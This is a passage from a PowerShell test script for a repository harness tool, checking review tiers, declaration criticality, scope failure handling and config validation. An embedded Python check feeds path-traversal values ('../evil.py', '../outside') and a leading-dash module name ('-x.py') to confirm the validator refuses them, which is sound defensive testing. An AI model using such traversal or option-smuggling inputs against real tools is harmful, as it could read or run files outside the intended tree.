$CFG_DER_BAD = $CFG_DER.Replace('"source": "src/"', '"source": "src"')
$w4 = New-Repo 'derived-bad' $CFG_DER_BAD @('src/tool.py', 'placed/tool.py')
$rW4 = Invoke-Gates $w4 @()
$ok = (Assert-True 'W4 an invalid derived entry warns and is ignored' ($rW4.Out -match "review\.derived\[0\].*must be path PREFIXES ending in '/'" -and $rW4.Out -match 'refused: src') $rW4.Out) -and $ok
$ok = (Assert-True 'W4 the dropped mapping buys no exemption (tier full via critical)' ($rW4.Out -match 'review tier: full — critical surface touched \(placed/tool\.py') $rW4.Out) -and $ok

# --- X: declaration criticality computed from changed keys (ADR 0038) ---------------------------
# {docs, handoff, artifacts} and comments feed reporting only; everything else is critical in
# every repo, declared or not — the declaration cannot opt itself out.
$CFG_X = @'
{
  "//note": "a",
  "handoff": "",
  "review": {
    "canon": "REVIEW.md",
    "docs_only": ["^docs/"],
    "harness_layer": [],
    "critical": ["^\\.harness\\.json$"]
  },
  "groups": []
}
'@
# X1: metadata-only edit in a repo that DECLARED the file critical — refined to the size tier.
$x1 = New-Repo 'decl-meta' $CFG_X @()
$x1cfg = Join-Path $x1 '.harness.json'
(Get-Content -Raw -LiteralPath $x1cfg).Replace('"handoff": ""', '"handoff": "HANDOFF.md"') | Set-Content -LiteralPath $x1cfg -NoNewline
$rX1 = Invoke-Gates $x1 @()
$ok = (Assert-True 'X1 a metadata-only declaration edit does not force critical' ($rX1.Out -match 'review tier: small' -and $rX1.Out -notmatch 'critical surface touched') $rX1.Out) -and $ok
$ok = (Assert-True 'X1 the refinement names its keys' ($rX1.Out -match 'declaration change confined to metadata keys \(handoff\) — not counted as critical') $rX1.Out) -and $ok

# X2: a non-metadata key changes in a repo that NEVER declared the file critical — forced full.
$CFG_X2 = $CFG_X.Replace('"critical": ["^\\.harness\\.json$"]', '"critical": []')
$x2 = New-Repo 'decl-groups' $CFG_X2 @()
$x2cfg = Join-Path $x2 '.harness.json'
(Get-Content -Raw -LiteralPath $x2cfg).Replace('"groups": []', '"groups": [ { "name": "g", "match": "^g/", "cwd": "", "strip_prefix": "", "gates": [] } ]') | Set-Content -LiteralPath $x2cfg -NoNewline
$rX2 = Invoke-Gates $x2 @()
$ok = (Assert-True 'X2 a groups change is critical even undeclared' ($rX2.Out -match 'review tier: full — critical surface touched \(\.harness\.json') $rX2.Out) -and $ok
$ok = (Assert-True 'X2 the forcing names its keys' ($rX2.Out -match 'declaration keys changed \(groups\) — the declaration decides what runs and what gets reviewed, so it is critical in every repo') $rX2.Out) -and $ok

# X3: a comment-only edit compares equal after comment stripping — never critical.
$x3 = New-Repo 'decl-comment' $CFG_X @()
$x3cfg = Join-Path $x3 '.harness.json'
(Get-Content -Raw -LiteralPath $x3cfg).Replace('"//note": "a"', '"//note": "b"') | Set-Content -LiteralPath $x3cfg -NoNewline
$rX3 = Invoke-Gates $x3 @()
$ok = (Assert-True 'X3 a comment-only declaration edit is named and not critical' ($rX3.Out -match 'declaration change is comment-only — not counted as critical' -and $rX3.Out -notmatch 'critical surface touched') $rX3.Out) -and $ok

# X5: explicit-files mode ignores --range for the declaration base too (the contract
# print_scope announces): the base is HEAD, so a bogus range must not flip a metadata edit to
# undetermined/critical (review 2026-08-07, medium — the guard changed_lines already had).
$x5 = New-Repo 'decl-explicit' $CFG_X @()
$x5cfg = Join-Path $x5 '.harness.json'
(Get-Content -Raw -LiteralPath $x5cfg).Replace('"handoff": ""', '"handoff": "HANDOFF.md"') | Set-Content -LiteralPath $x5cfg -NoNewline
$rX5 = Invoke-Gates $x5 @('--range', 'deadbeef..HEAD', '.harness.json')
$ok = (Assert-True 'X5 explicit files ignore --range for the declaration base too' ($rX5.Out -match 'declaration change confined to metadata keys \(handoff\)' -and $rX5.Out -notmatch 'undetermined') $rX5.Out) -and $ok

# X4: a NEWLY ADDED declaration has no base to diff against — undetermined is critical, never
# safe (adopting the file that decides what runs deserves the strongest first review).
$x4 = New-Repo 'decl-new' '' @()
Set-Content -LiteralPath (Join-Path $x4 '.harness.json') -Value '{ "groups": [] }' -NoNewline
$rX4 = Invoke-Gates $x4 @()
$ok = (Assert-True 'X4 a newly added declaration is critical (undetermined base)' ($rX4.Out -match 'review tier: full — critical surface touched \(\.harness\.json' -and $rX4.Out -match 'declaration keys changed \(undetermined\)') $rX4.Out) -and $ok

# X6: `artifacts` LEFT the safe set with ADR 0068 — items[].check composes a command CI runs, so
# an artifacts edit forces critical now (over-approximate for a title typo, erring toward
# critical). This case is the mutation anchor for putting the key back by mistake.
$x6 = New-Repo 'decl-artifacts' $CFG_X @()
$x6cfg = Join-Path $x6 '.harness.json'
(Get-Content -Raw -LiteralPath $x6cfg).Replace('"handoff": ""', '"handoff": "", "artifacts": { "readme": "README.md", "items": [] }') | Set-Content -LiteralPath $x6cfg -NoNewline
$rX6 = Invoke-Gates $x6 @()
$ok = (Assert-True 'X6 an artifacts change is critical since ADR 0068 (check reaches command composition)' ($rX6.Out -match 'declaration keys changed \(artifacts\)' -and $rX6.Out -match 'review tier: full — critical surface touched \(\.harness\.json') $rX6.Out) -and $ok

# --- H: handoff declaration forms (ADR 0040) ----------------------------------------------------
# A trailing '/' declares a per-work-line directory and the emitter must say so — the slice-close
# instruction is "update the handoff the emitter named", so the form has to be visible where it
# is read. The file form stays byte-stable: no annotation.
$CFG_H = @'
{
  "handoff": "docs/handoff/",
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": []
}
'@
$h1 = New-Repo 'handoff-dir' $CFG_H @('src/tool.py')
$rH1 = Invoke-Gates $h1 @()
$ok = (Assert-True 'H1 a trailing-slash handoff is annotated as a per-work-line directory' ($rH1.Out -match 'handoff: docs/handoff/ — directory: one resume file per work line') $rH1.Out) -and $ok

$h2 = New-Repo 'handoff-file' ($CFG_H.Replace('"handoff": "docs/handoff/"', '"handoff": "SESSION_HANDOFF.md"')) @('src/tool.py')
$rH2 = Invoke-Gates $h2 @()
$ok = (Assert-True 'H2 a file-form handoff line carries no directory annotation' ($rH2.Out -match 'handoff: SESSION_HANDOFF\.md' -and $rH2.Out -notmatch 'one resume file per work line') $rH2.Out) -and $ok

# --- Y: fail-loud scope + full-tree audit (ADR 0041) ---------------------------------------------
# Y1: the pre-0041 defect this section exists to keep dead: a git failure inside scope
# resolution printed one stderr line and exited 0 with EMPTY stdout — no ungrouped marker, no
# artifact line, no gate commands — and every grep-shaped CI step read that silence as green.
# The contract now: stdout marker + non-zero exit, and NOTHING below the marker is computed.
# Reverting the except-branch to `return 0` turns both assertions red.
$y1 = New-Repo 'scope-fail' $CFG @('api/app.py')
$rY1 = Invoke-Gates $y1 @('--range', 'no-such-ref..HEAD')
$ok = (Assert-True 'Y1 an unresolvable range exits non-zero (the one non-advisory exit)' ($rY1.Code -ne 0) "exit=$($rY1.Code) out=$($rY1.Out)") -and $ok
$ok = (Assert-True 'Y1 the failure is a stdout marker, not only stderr' ($rY1.Out -match 'scope: FAILED — git could not resolve' -and $rY1.Out -match 'must not be read as a pass') $rY1.Out) -and $ok
$ok = (Assert-True 'Y1 nothing below the marker is computed (no gates window, no tier)' ($rY1.Out -notmatch '(?m)^gates:' -and $rY1.Out -notmatch 'review tier:') $rY1.Out) -and $ok
# The stderr diagnostic must be LEGIBLE git text, not a Python bytes-repr: git_lines pins the
# subprocess encoding so CalledProcessError.stderr reaches this print as str (review 2026-08-12,
# medium — a success-path-only decode passed every case while garbling the one line that exists
# to be read). Reverting the encoding args to a manual .decode() turns exactly this assertion red.
$ok = (Assert-True 'Y1 the stderr diagnostic is legible text, not bytes-repr' ($rY1.Out -match 'git failed: fatal' -and $rY1.Out -notmatch "git failed: b'") $rY1.Out) -and $ok

# Y2: verify_map shares the scope path and the same contract (its silence read as "nothing to
# verify" to the /verify skill). It reads the docs index BEFORE resolving scope — that earlier
# unreadable-index return is a REPORTED advisory degrade, not this class — so the fixture needs
# a minimal index for the run to reach the scope path at all.
New-Item -ItemType Directory -Force -Path (Join-Path $y1 'docs') | Out-Null
Set-Content -LiteralPath (Join-Path $y1 'docs/index.json') -Value '{"spec": []}' -NoNewline
$vmap = Join-Path $PSScriptRoot 'verify_map.py'
$rY2out = & $py.Source @($vmap, '--repo', $y1, '--range', 'no-such-ref..HEAD') 2>&1 | Out-String
$rY2code = $LASTEXITCODE
$ok = (Assert-True 'Y2 verify_map fails loudly on an unresolvable range too' ($rY2code -ne 0 -and $rY2out -match 'scope: FAILED') "exit=$rY2code out=$rY2out") -and $ok

# Y3: --all audits the FULL TREE — files nowhere near any diff are classified (the H2 defect:
# two individually green PRs compose a main state no ranged run ever saw; partition is a tree
# property). seed.txt is tracked, committed, unchanged — a ranged or worktree run never lists
# it; --all must, and must report it ungrouped.
$y3 = New-Repo 'all-audit' $CFG @('api/app.py')
$rY3 = Invoke-Gates $y3 @('--all')
$ok = (Assert-True 'Y3 --all exits 0' ($rY3.Code -eq 0) "exit=$($rY3.Code)") -and $ok
$ok = (Assert-True 'Y3 the scope line names the full tree with both counts' ($rY3.Out -match 'scope: full tree — tracked \d+ · untracked \d+ = \d+ unique file\(s\) \(--all\)') $rY3.Out) -and $ok
$ok = (Assert-True 'Y3 a committed unchanged file is in scope and reported ungrouped' ($rY3.Out -match 'ungrouped \(' -and $rY3.Out -match 'seed\.txt') $rY3.Out) -and $ok
$ok = (Assert-True 'Y3 gates still compose over matching files' ($rY3.Out -match 'uv run ruff check app\.py') $rY3.Out) -and $ok
$ok = (Assert-True 'Y3 the tier line is the audit form, keeping the parser sentinel prefix' ($rY3.Out -match '(?m)^review tier: full-tree audit — a tier applies to a slice') $rY3.Out) -and $ok
$ok = (Assert-True 'Y3 no per-slice tier wording leaks into audit mode' ($rY3.Out -notmatch 'review tier: (skip|small|full) ') $rY3.Out) -and $ok

# Y4: --all with --range or files — --all wins and says so on stderr (a mixed invocation must
# not silently half-apply).
$rY4 = Invoke-Gates $y3 @('--all', '--range', 'HEAD~1..HEAD')
$ok = (Assert-True 'Y4 --all overrides --range with a stderr note' ($rY4.Out -match '--all given — ignoring --range' -and $rY4.Out -match 'scope: full tree') $rY4.Out) -and $ok

# Y5: an unborn HEAD (git init && git add, no commit yet) is a NORMAL state, not the fail-loud
# class — the ADR 0041 exception fired on exactly this before the fix (review 2026-08-10,
# high). The honest scope is staged+unstaged vs the empty tree, reported not failed; a fresh
# scaffold's very first emitter run is this state.
$y5 = Join-Path $fxBase 'unborn-head'
New-Item -ItemType Directory -Force -Path (Join-Path $y5 'api') | Out-Null
Set-Content -LiteralPath (Join-Path $y5 '.harness.json') -Value $CFG -NoNewline
Set-Content -LiteralPath (Join-Path $y5 'api/app.py') -Value 'x' -NoNewline
Push-Location $y5
try { & git init -q 2>$null; & git add -A 2>$null } finally { Pop-Location }
$rY5 = Invoke-Gates $y5 @()
$ok = (Assert-True 'Y5 unborn HEAD exits 0 — a fresh repo is not a scope failure' ($rY5.Code -eq 0) "exit=$($rY5.Code) out=$($rY5.Out)") -and $ok
$ok = (Assert-True 'Y5 the staged file is in scope and gated' ($rY5.Out -match 'uv run ruff check app\.py') $rY5.Out) -and $ok
$ok = (Assert-True 'Y5 the unborn state is reported, not silent' ($rY5.Out -match 'unborn HEAD') $rY5.Out) -and $ok
$ok = (Assert-True 'Y5 no scope-FAILED marker fires' ($rY5.Out -notmatch 'scope: FAILED') $rY5.Out) -and $ok

# Y6: --all on an empty tree still prints the trailer facts — review-canon existence (and hooks
# wiring where .githooks/ exists) are TREE facts a full-tree audit exists to report; the
# empty-scope early return skipped them before the fix (review 2026-08-10, low).
$y6 = Join-Path $fxBase 'all-empty'
New-Item -ItemType Directory -Force -Path $y6 | Out-Null
Push-Location $y6
try { & git init -q 2>$null } finally { Pop-Location }
$rY6 = Invoke-Gates $y6 @('--all')
$ok = (Assert-True 'Y6 --all on an empty tree exits 0 and still prints the trailer facts' ($rY6.Code -eq 0 -and $rY6.Out -match 'review canon:') "exit=$($rY6.Code) out=$($rY6.Out)") -and $ok

# Y7: non-ASCII paths survive scope resolution VERBATIM (issue #40). git's default
# core.quotepath=true octal-escapes any non-ASCII path (`"docs/AWS \354..."`), no anchored group
# pattern matches the quoted form, and every such file reads as ungrouped — exactly in CI, whose
# fresh checkout carries no local quotepath override (dev clones usually do, which is why six
# main-push failures shipped before any local repro). The fixture pins quotepath=true repo-locally
# to reproduce the CI default on any machine; the fix (`-c core.quotepath=false` in git_lines)
# overrides repo config, so reverting it turns Y7 red. Two files on purpose: the grouped one is
# the #40 regression, the ungrouped one is NAMED in output and proves the path arrives raw
# end-to-end (git → UTF-8 decode → report), not merely regrouped.
$cfgY7 = '{ "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] }, "groups": [ { "name": "docs", "match": "^docs/", "cwd": "", "strip_prefix": "", "gates": [] } ] }'
$y7 = New-Repo 'quotepath' $cfgY7 @()
foreach ($f in @('docs/AWS 조직통합_경영보고.html', '메모.rb')) {
    $full = Join-Path $y7 $f
    $dir = Split-Path -Parent $full
    if ($dir -and -not (Test-Path -LiteralPath $dir)) { New-Item -ItemType Directory -Force -Path $dir | Out-Null }
    Set-Content -LiteralPath $full -Value 'x' -NoNewline
}
& git -C $y7 config core.quotepath true 2>$null
Invoke-FixtureCommit $y7 'non-ascii paths'
$rY7 = Invoke-Gates $y7 @('--all')
$ok = (Assert-True 'Y7 --all exits 0 with non-ASCII tracked paths' ($rY7.Code -eq 0) "exit=$($rY7.Code) out=$($rY7.Out)") -and $ok
$ok = (Assert-True 'Y7 the non-ASCII file is claimed by its group, not ungrouped' ($rY7.Out -match '\[docs\] 1 file') $rY7.Out) -and $ok
$ok = (Assert-True 'Y7 the ungrouped non-ASCII file is named VERBATIM' ($rY7.Out -match 'ungrouped \(2 file' -and $rY7.Out -match [regex]::Escape('메모.rb') -and $rY7.Out -match 'seed\.txt') $rY7.Out) -and $ok
$ok = (Assert-True 'Y7 no octal-escaped or C-quoted path anywhere in the report' ($rY7.Out -notmatch '\\\d{3}' -and $rY7.Out -notmatch '"docs/') $rY7.Out) -and $ok

# --- Z: built-in scaffold claims (ADR 0044) ------------------------------------------------------
# Z1: a scaffold-placed path no declared group matches is claimed built-in and REPORTED with its
# name; a genuinely foreign file still fails the partition alone. Mutation anchors: dropping the
# built-in claim moves .harness-version into ungrouped (the 1-file count fails); dropping the
# report block fails the scaffold-claimed match while the count assertion still holds — each
# half of the mechanism fails a distinct assertion.
$z1 = New-Repo 'scaffold-claim' $CFG @('.harness-version', 'weird/thing.rb')
$rZ1 = Invoke-Gates $z1 @()
$ok = (Assert-True 'Z1 scaffold path claimed built-in, reported with the ADR' ($rZ1.Out -match 'scaffold-claimed \(1 file\(s\)' -and $rZ1.Out -match 'ADR 0044') $rZ1.Out) -and $ok
$ok = (Assert-True 'Z1 the claimed path is NAMED on a 2-space line (parser-inert shape)' ($rZ1.Out -match '(?m)^  \.harness-version\s*$') $rZ1.Out) -and $ok
$ok = (Assert-True 'Z1 the header sits at column 0 and never at command depth' ($rZ1.Out -match '(?m)^scaffold-claimed \(' -and $rZ1.Out -notmatch '(?m)^    \.harness-version') $rZ1.Out) -and $ok
$ok = (Assert-True 'Z1 the foreign file still fails the partition alone' ($rZ1.Out -match 'ungrouped \(1 file' -and $rZ1.Out -match 'weird/thing\.rb') $rZ1.Out) -and $ok

# Z2: a declared group WINS over the built-in claim — the set consumes leftovers only, so a repo
# that already claims a scaffold path (every pre-0044 scaffolded repo does) changes nothing.
$metaCfg = '{ "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] }, "groups": [ { "name": "meta", "match": "^\\.harness-version$", "cwd": "", "strip_prefix": "", "gates": [] } ] }'
$z2 = New-Repo 'scaffold-claim-declared' $metaCfg @('.harness-version')
$rZ2 = Invoke-Gates $z2 @()
$ok = (Assert-True 'Z2 a declared group WINS over the built-in claim' ($rZ2.Out -match '\[meta\] 1 file' -and $rZ2.Out -notmatch 'scaffold-claimed') $rZ2.Out) -and $ok

# Z3: the claim composes with --all (CI's push-run partition audit is where the pre-0044 failure
# actually landed): the tracked, unchanged .harness.json is in the full-tree scope, claimed
# built-in, and only the repo's own files stay ungrouped.
$rZ3 = Invoke-Gates $z1 @('--all')
$ok = (Assert-True 'Z3 --all claims scaffold paths built-in too' ($rZ3.Out -match 'scaffold-claimed \(2 file\(s\)' -and $rZ3.Out -match '(?m)^  \.harness\.json\s*$') $rZ3.Out) -and $ok
$ok = (Assert-True 'Z3 --all still fails the partition on the repo''s own files' ($rZ3.Out -match 'ungrouped \(' -and $rZ3.Out -match 'weird/thing\.rb') $rZ3.Out) -and $ok

# Z4: THE PAIRING GATE — harness_config.SCAFFOLD_CLAIMS must equal init.ps1's placement-map
# destinations plus the generated .harness-version stamp, in BOTH directions (ADR 0044's
# accepted second copy; the fm_digest pairing shape). Extraction is STRICT: a computed value in
# a placement map fails this case loudly rather than degrading to a fragment (the ADR 0033
# lesson — a fragment in the map is a wrong path compared quietly). Scope, stated so this is
# never read wider than it checks (review 2026-08-11, low): the pairing covers the DESTINATION
# axis only — the only axis SCAFFOLD_CLAIMS carries. A template SOURCE-key rename with the same
# destination, or a GUARD_MARKER change, passes here by design; both are irrelevant to claims.
$initPath = Join-Path $PSScriptRoot '../skills/harness-init/init.ps1'
$zTok = $null; $zErr = $null
$initAst = [System.Management.Automation.Language.Parser]::ParseFile($initPath, [ref]$zTok, [ref]$zErr)
function Get-ZPureString($Node) {
    if ($Node -is [System.Management.Automation.Language.StringConstantExpressionAst]) { return $Node.Value }
    if ($Node -is [System.Management.Automation.Language.CommandExpressionAst]) { return (Get-ZPureString $Node.Expression) }
    if ($Node -is [System.Management.Automation.Language.PipelineAst]) {
        $e = @($Node.PipelineElements)
        if ($e.Count -eq 1) { return (Get-ZPureString $e[0]) }
    }
    return $null
}
function Get-ZMapDestinations($Ast, [string]$VarName) {
    $asgn = $Ast.Find({ param($a)
            $a -is [System.Management.Automation.Language.AssignmentStatementAst] -and
            $a.Left -is [System.Management.Automation.Language.VariableExpressionAst] -and
            $a.Left.VariablePath.UserPath -eq $VarName }, $true)
    if (-not $asgn) { return $null }
    $e = $asgn.Right
    if ($e -is [System.Management.Automation.Language.PipelineAst]) {
        $el = @($e.PipelineElements)
        if ($el.Count -ne 1) { return $null }
        $e = $el[0]
    }
    if ($e -is [System.Management.Automation.Language.CommandExpressionAst]) { $e = $e.Expression }
    while ($e -is [System.Management.Automation.Language.AttributedExpressionAst]) { $e = $e.Child }
    if ($e -isnot [System.Management.Automation.Language.HashtableAst]) { return $null }
    $vals = @()
    foreach ($kv in $e.KeyValuePairs) {
        $v = Get-ZPureString $kv.Item2
        if ($null -eq $v) { return $null }
        $vals += $v
    }
    return $vals
}
$zDests = @()
$zExtractOk = $true
foreach ($m in 'TOOLCHAIN', 'GUARDED', 'SEED', 'SEED_CORPUS') {
    $v = Get-ZMapDestinations $initAst $m
    if ($null -eq $v -or -not $v.Count) { $zExtractOk = $false; break }
    $zDests += $v
}
$ok = (Assert-True 'Z4 init.ps1 placement maps extract whole (strict — no fragments)' $zExtractOk 'AST extraction returned null/empty for a placement map — init.ps1 literals moved; fix the extraction or the maps, and keep SCAFFOLD_CLAIMS paired') -and $ok
if ($zExtractOk) {
    $zExpected = @($zDests + '.harness-version' | Sort-Object -Unique)
    $zSavedPP = $env:PYTHONPATH
    $env:PYTHONPATH = $PSScriptRoot
    try {
        $zActual = @(& $py.Source -c "import harness_config; print('\n'.join(sorted(harness_config.SCAFFOLD_CLAIMS)))" 2>&1) |
            ForEach-Object { ([string]$_).Trim() } | Where-Object { $_ }
    }
    finally { $env:PYTHONPATH = $zSavedPP }
    $zMissing = @($zExpected | Where-Object { $zActual -notcontains $_ })
    $zExtra = @($zActual | Where-Object { $zExpected -notcontains $_ })
    $ok = (Assert-True 'Z4 SCAFFOLD_CLAIMS == init.ps1 destinations + .harness-version (both directions)' `
        (-not $zMissing.Count -and -not $zExtra.Count) `
        "missing from SCAFFOLD_CLAIMS: [$($zMissing -join ', ')] · extra in SCAFFOLD_CLAIMS: [$($zExtra -join ', ')]") -and $ok
}

# --- AA: the customer-corpus declaration (ADR 0060) — validated by the reader, off by default ---
# `docs.customer` is the schema the client-pjems build_docs.py fork upstreams into. Three states
# must stay distinguishable (off / malformed / validated); a traversal `dir` must be REFUSED into
# the malformed state, never defaulted (a default would build a customer page from a directory
# nobody named — and `..` would publish files from outside the repo into it); and every degraded
# sub-value must warn while dropping only the entry — the fork carried these rules as constants
# that no canon fix could ever reach. Direct import, like case V: the emitter prints no parsed
# config, so shape assertions need the dict itself.
$aaScript = Join-Path $fxBase 'customer_checks.py'
Set-Content -LiteralPath $aaScript -NoNewline -Value @'
import json, sys
from pathlib import Path
sys.path.insert(0, sys.argv[1])
import harness_config as hc
root = Path(sys.argv[2])
(root / "docs" / "customer" / "prog").mkdir(parents=True, exist_ok=True)
fails = []
def load(decl):
    (root / ".harness.json").write_text(json.dumps(decl), encoding="utf-8")
    return hc.load(root)
# 1 absent and null are both OFF, with no warning
for decl in ({"docs": {"index": "docs/index.json"}}, {"docs": {"customer": None}}):
    cfg, w = load(decl)
    if cfg["customer"] is not None or any("customer" in m for m in w):
        fails.append("absent/null did not read as OFF without warnings: %r" % w)
# 2 a valid block validates silently; defaults fill; a trailing slash on dir is normalized
cfg, w = load({"docs": {"customer": {"dir": "docs/customer/", "title": "r · 고객 문서",
    "chip_field": "program_file", "chip_suffix": ".p",
    "groups": [{"label": "A (25.x)", "keys": [25]}, {"label": "B", "keys": [27, 28]}],
    "other_label": "기타", "unkeyed_label": "배치", "projects_md": True}}})
c = cfg["customer"]
if w or c["malformed"] or c["dir"] != "docs/customer" or c["group_field"] != "menu" \
   or c["groups"] != [{"label": "A (25.x)", "keys": [25]}, {"label": "B", "keys": [27, 28]}] \
   or c["projects_md"] is not True or [s["tag"] for s in c["release_stages"]] != ["FUT", "UAT", "PROD"]:
    fails.append("a valid block did not validate cleanly: %r %r" % (c, w))
# 3 a traversal dir is REFUSED into the malformed state, never defaulted
cfg, w = load({"docs": {"customer": {"dir": "../outside"}}})
if cfg["customer"]["malformed"] != "dir refused" or not any("CANNOT be built" in m for m in w):
    fails.append("traversal dir was not refused as malformed: %r %r" % (cfg["customer"], w))
# 4 a non-object block is malformed
cfg, w = load({"docs": {"customer": "yes"}})
if not cfg["customer"]["malformed"] or not any("expected an object" in m for m in w):
    fails.append("non-object block was not malformed")
# 5 a missing corpus dir warns and is KEPT (the builder refuses at build time and names it)
cfg, w = load({"docs": {"customer": {"dir": "docs/nope"}}})
if cfg["customer"]["malformed"] or not any("does not exist" in m for m in w):
    fails.append("missing dir did not warn, or was wrongly malformed: %r" % w)
# 6 every degraded sub-value warns; the ENTRY is dropped, never the block
cfg, w = load({"docs": {"customer": {"dir": "docs/customer", "bogus": 1, "//c": "x",
    "projects_md": "false", "chip_field": "bad key!", "required_frontmatter": ["ok_key", "bad-key"],
    "groups": [{"label": "a"}, {"label": "b", "keys": ["25"]}, {"label": "c", "keys": [1, True]},
               "str", {"label": "e", "keys": [9], "x": 1}],
    "release_stages": [{"tag": "FUT"}, {"tag": "FUT", "label": "dup"}, {"tag": "bad tag"},
                       {"tag": "PROD", "label": "완료"}],
    "title": 5, "eyebrow": "line\ntwo"}}})
c = cfg["customer"]
joined = "\n".join(w)
expect = ["unknown key 'bogus' ignored (known: dir, title", "projects_md: must be a JSON boolean",
          "treated as false", "chip_field: 'bad key!' is not a frontmatter key name",
          "required_frontmatter: 'bad-key' is not a frontmatter key name",
          "groups[0]: needs a non-empty 'label' and 'keys'", "groups[1]: needs", "refused: 25",
          "groups[2]: needs", "refused: True", "groups[3]: expected an object",
          "groups[4]: unknown key 'x' ignored (known: label, keys)",
          "release_stages[1]: duplicate tag 'FUT'", "release_stages[2]: tag 'bad tag' must be",
          "title: must be a string", "eyebrow: control character(s)"]
for e in expect:
    if e not in joined:
        fails.append("missing warning: %s" % e)
if "'//c'" in joined:
    fails.append("a //-prefixed key warned")
if c["malformed"] or c["projects_md"] is not False or c["chip_field"] != "" \
   or c["required_frontmatter"] != ["ok_key"] or c["groups"] != [{"label": "e", "keys": [9]}] \
   or c["release_stages"] != [{"tag": "FUT", "label": "FUT"}, {"tag": "PROD", "label": "완료"}] \
   or c["title"] != "" or c["eyebrow"] != "line\\ntwo":
    fails.append("degraded values were not dropped/defaulted as declared: %r" % c)
if "\n" in c["eyebrow"]:
    fails.append("a raw newline survived into a display value")
# 7 wrong container types are ignored with a warning; defaults stay
cfg, w = load({"docs": {"customer": {"groups": "no", "release_stages": [{"tag": "!!"}],
                                     "required_frontmatter": "x"}}})
c = cfg["customer"]
if c["groups"] != [] or c["required_frontmatter"] != [] \
   or [s["tag"] for s in c["release_stages"]] != ["FUT", "UAT", "PROD"] \
   or not any("groups: expected a list" in m for m in w) \
   or not any("every entry was rejected — using the default vocabulary" in m for m in w):
    fails.append("wrong container types were not defaulted with warnings: %r %r" % (c, w))
# 8 an EXPLICIT empty value warns and defaults — "" is something the declarer wrote, never
#   "absent" (review 2026-08-27, high: this was the one silent path in the block)
cfg, w = load({"docs": {"customer": {"dir": "", "chip_field": "", "group_field": "", "title": "",
                                     "required_frontmatter": ["", "ok"], "release_stages": []}}})
c = cfg["customer"]
joined = "\n".join(w)
for e in ["dir: declared empty — using the default 'docs/customer'", "chip_field: declared empty — ignored",
          "group_field: declared empty — using the default 'menu'",
          "required_frontmatter: declared empty — ignored",
          "release_stages: declared empty — using the default vocabulary"]:
    if e not in joined:
        fails.append("missing empty-value warning: %s" % e)
if "every entry was rejected" in joined:
    fails.append("an EMPTY release_stages list was reported as 'every entry was rejected'")
if c["malformed"] or c["dir"] != "docs/customer" or c["group_field"] != "menu" \
   or c["required_frontmatter"] != ["ok"] or [s["tag"] for s in c["release_stages"]] != ["FUT", "UAT", "PROD"]:
    fails.append("explicit empties did not take the defaults: %r" % c)
# 9 declared-vs-unset is carried: the explicit "" title IS declared, the absent eyebrow is NOT
if "title" not in c["declared"] or "eyebrow" in c["declared"] or "dir" not in c["declared"]:
    fails.append("`declared` does not distinguish an explicit \"\" from an absent key: %r" % c["declared"])
# 10 defaults are copied per load — mutating a returned value cannot poison the next load
#    (review 2026-08-27, medium: the shallow list copy aliased the default stage dicts)
cfg, w = load({"docs": {"customer": {}}})
if w or cfg["customer"]["declared"] != [] or cfg["customer"]["malformed"]:
    fails.append("an empty object did not read as ON-with-defaults, silently: %r %r" % (cfg["customer"], w))
cfg["customer"]["release_stages"][0]["label"] = "POISON"
cfg2, _ = load({"docs": {"customer": {}}})
if cfg2["customer"]["release_stages"][0]["label"] != "FUT":
    fails.append("a mutation of a returned default poisoned the next load")
# 11 panels (the extension point): a module path is a script-gate-class value — the builder
#    IMPORTS it — so traversal / leading dash / non-.py are refused per entry; a missing file is
#    kept and warned (the builder refuses at build time); a blank label drops the entry
(root / "scripts" / "panels").mkdir(parents=True, exist_ok=True)
(root / "scripts" / "panels" / "ok.py").write_text("CSS=''\ndef render_panel(root):\n    return '<p>x</p>'\n", encoding="utf-8")
cfg, w = load({"docs": {"customer": {"panels": [
    {"module": "scripts/panels/ok.py", "label": "환경 차이"},
    {"module": "../evil.py", "label": "t"},
    {"module": "-x.py", "label": "t"},
    {"module": "scripts/panels/notpy.txt", "label": "t"},
    {"module": "scripts/panels/missing.py", "label": "later"},
    {"module": "scripts/panels/ok.py", "label": ""},
    "str", {"module": "scripts/panels/ok.py", "label": "k", "z": 1}]}}})
c = cfg["customer"]
joined = "\n".join(w)
if [p["module"] for p in c["panels"]] != ["scripts/panels/ok.py", "scripts/panels/missing.py", "scripts/panels/ok.py"] \
   or c["panels"][0]["label"] != "환경 차이":
    fails.append("panels did not keep exactly the safe entries: %r" % c["panels"])
for e in ["panels[1]: module '../evil.py' refused", "panels[2]: module '-x.py' refused",
          "panels[3]: module 'scripts/panels/notpy.txt' refused",
          "panels[4]: module 'scripts/panels/missing.py' does not exist",
          "panels[5]: needs a non-empty 'label'", "panels[6]: expected an object",
          "panels[7]: unknown key 'z' ignored (known: module, label, id, position)"]:
    if e not in joined:
        fails.append("missing panels warning: %s" % e)
cfg, w = load({"docs": {"customer": {"panels": "no"}}})
if cfg["customer"]["panels"] != [] or not any("panels: expected a list" in m for m in w):
    fails.append("a non-list panels value was not defaulted with a warning")
# 12 ADR 0061 — panel id / position / default_tab / footer_date_label: a declared id is used
#    verbatim; a refused or duplicate id drops the ENTRY (a published deep link is never silently
#    renamed); 'docs' is reserved; an absent id derives (label slug, else panel-<n> over the KEPT
#    entries); a bad position degrades to after-docs; default_tab is validated against the FINAL ids
cfg, w = load({"docs": {"customer": {"panels": [
    {"module": "scripts/panels/ok.py", "label": "프로세스 맵", "id": "process", "position": "before-docs"},
    {"module": "scripts/panels/ok.py", "label": "환경 차이"},
    {"module": "scripts/panels/ok.py", "label": "Env Diff", "position": "sideways"},
    {"module": "scripts/panels/ok.py", "label": "dup", "id": "process"},
    {"module": "scripts/panels/ok.py", "label": "res", "id": "docs"},
    {"module": "scripts/panels/ok.py", "label": "bad", "id": "Top-1"}],
    "default_tab": "env-diff", "footer_date_label": "최종 갱신"}}})
c = cfg["customer"]
if [(p["id"], p["position"]) for p in c["panels"]] != [("process", "before-docs"), ("panel-1", "after-docs"), ("env-diff", "after-docs")]:
    fails.append("panel ids/positions: %r" % c["panels"])
if c["default_tab"] != "env-diff" or c["footer_date_label"] != "최종 갱신" or "default_tab" not in c["declared"]:
    fails.append("default_tab/footer_date_label not carried: %r %r" % (c["default_tab"], c["footer_date_label"]))
for e in ["panels[2]: position 'sideways' is not one of before-docs, after-docs — using 'after-docs'",
          "panels[3]: id 'process' is already taken — entry ignored",
